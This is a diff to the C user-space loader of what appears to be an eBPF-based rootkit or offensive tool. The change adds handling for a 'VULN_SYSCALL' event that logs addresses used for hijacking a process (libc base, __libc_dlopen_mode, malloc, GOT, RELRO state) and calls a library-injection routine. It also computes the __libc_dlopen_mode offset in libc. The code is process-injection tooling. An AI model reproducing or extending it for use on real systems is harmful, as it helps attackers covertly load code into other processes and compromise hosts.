@@ -15,6 +15,8 @@
 #include <net/if.h>
 #include <unistd.h>
 #include <locale.h>
+#include <dlfcn.h>
+#include <link.h>
 
 #include <bpf/bpf.h>
 
@@ -29,6 +31,7 @@
 #include "include/utils/structures/fdlist.h"
 #include "include/modules/module_manager.h"
 #include "include/utils/network/ssl_client.h"
+#include "include/utils/mem/injection.h"
 
 #define ABORT_IF_ERR(err, msg)\
 	if(err<0){\
@@ -152,7 +155,7 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 	tm = localtime(&t);
 	strftime(ts, sizeof(ts), "%H:%M:%S", tm);
 
-
+	//Before parsing any data, check the type
     if(e->event_type == INFO){
 		printf("%s INFO  pid:%d code:%i, msg:%s\n", ts, e->pid, e->code, e->message);
 	}else if(e->event_type == DEBUG){
@@ -249,6 +252,12 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 		memcpy(data.payload, e->bps_data.payload, 64);
 		printf("Post value: %i, %i, %i, %s\n", data.active, data.d_ip, data.d_port, data.payload);
 		bpf_map_update_elem(FD_TC_MAP, &key, &data, 0);
+	}else if(e->event_type == VULN_SYSCALL){
+		//eBPF detected syscall which can lead to library injection
+		printf("%s VULN_SYSCALL  pid:%d syscall:%llx, return:%llx, libc_main:%llx, libc_dlopen_mode:%llx, libc_malloc:%llx, got:%llx, relro:%i\n", ts, e->pid, e->syscall_address, e->process_stack_return_address, e->libc_main_address, e->libc_dlopen_mode_address, e->libc_malloc_address, e->got_address, e->relro_active);
+		if(manage_injection(e)<0){
+			printf("Library injection failed\n");
+		}
 	}else{
 		printf("%s COMMAND  pid:%d code:%i, msg:%s\n", ts, e->pid, e->code, e->message);
 		return -1;
@@ -404,6 +413,23 @@ int main(int argc, char**argv){
 		fprintf(stderr, "Failed to create ring buffer\n");
 		goto cleanup;
 	}
+
+	struct link_map *lm;
+	off_t offset = 0;
+	unsigned long long dlopenAddr;
+    lm = dlopen("libc.so.6", RTLD_LAZY);
+	if(lm==0){
+		perror("Error obtaining libc symbols");
+		return -1;
+	}
+    dlopenAddr = (unsigned long long)dlsym((void*)lm, "__libc_dlopen_mode");
+    printf("libdl: %lx\n", lm->l_addr);
+	printf("dlopen: %llx\n", dlopenAddr);
+	offset = dlopenAddr - lm->l_addr;
+	printf("Offset: %lx\n", offset);
+
+	//Once we have the offset of libc we proceed to uprobe our target program
+
 
 	//Now wait for messages from ebpf program
 	printf("Filter set and ready\n");
